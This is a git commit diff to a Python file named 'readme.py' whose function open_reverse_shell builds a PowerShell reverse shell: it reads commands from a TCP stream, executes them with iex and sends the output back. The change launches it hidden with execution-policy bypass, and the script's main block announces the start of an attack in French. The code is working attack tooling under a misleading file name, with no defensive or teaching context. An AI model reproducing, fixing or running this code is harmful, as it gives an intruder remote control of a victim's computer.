923334c4acb6f33998f00dc516a720a7f651ff3d
sol323083-bit <sol323083@gmail.com>
2025-09-28 02:32:49 -0400

    Update readme.py

--- readme.py
+++ readme.py
@@ -121,11 +121,10 @@ def open_reverse_shell():
                     '$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;' + \
                     '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );' + \
                     '$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
-        subprocess.Popen(['powershell', '-NoP', '-NonI', '-W', 'Hidden', '-Exec', 'Bypass', ps_command])
+        subprocess.Popen(['powershell', '-NoP', '-NonI', '-W', 'Hidden', '-Exec', 'Bypass', '-Command', ps_command], shell=True)
         print("Reverse shell tente")
     except Exception as e:
         print(f"Erreur reverse shell: {e}")
-
 if __name__ == "__main__":
     try:
         print("Debut de l'attaque...")
